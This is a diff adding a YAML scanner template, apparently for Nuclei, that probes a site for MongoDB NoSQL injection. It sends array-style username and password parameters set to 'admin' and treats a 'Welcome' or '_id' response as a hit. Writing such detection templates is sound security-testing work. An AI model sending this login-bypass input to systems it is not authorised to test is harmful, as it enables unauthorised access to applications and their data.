@@ -1,0 +1,15 @@
+id: K70n0s510-nosql
+info:
+  name: NoSQL Injection (MongoDB)
+  author: K70n0s510
+  severity: high
+  tags: sqli,nosql,mongo
+http:
+  - method: GET
+    path: ["{{BaseURL}}/?username[]=admin&password[]=admin"]
+    matchers-condition: and
+    matchers:
+      - type: word
+        words: ["Welcome", "\"_id\":"]
+      - type: status
+        status: [200]
